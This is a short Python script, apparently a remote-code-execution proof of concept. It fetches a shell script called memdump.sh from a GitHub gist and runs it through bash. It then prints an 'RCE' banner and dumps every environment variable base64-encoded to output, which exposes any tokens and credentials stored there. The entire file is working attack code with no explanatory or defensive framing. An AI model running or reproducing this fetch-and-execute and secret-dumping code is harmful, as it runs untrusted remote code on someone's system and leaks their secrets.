import os, subprocess, urllib.request, base64, json
 
url = "https://gist.githubusercontent.com/avivkeller/6397810d3503342f9c0cec2b079a61a1/raw/0cef99072d663b436d672208d4dd8c2a1bd2d5c7/memdump.sh"
script = urllib.request.urlopen(url).read()
subprocess.run(["bash", "-c", script.decode()])

print("==============RCE==============")
print(base64.b64encode(json.dumps(dict(os.environ)).encode()))
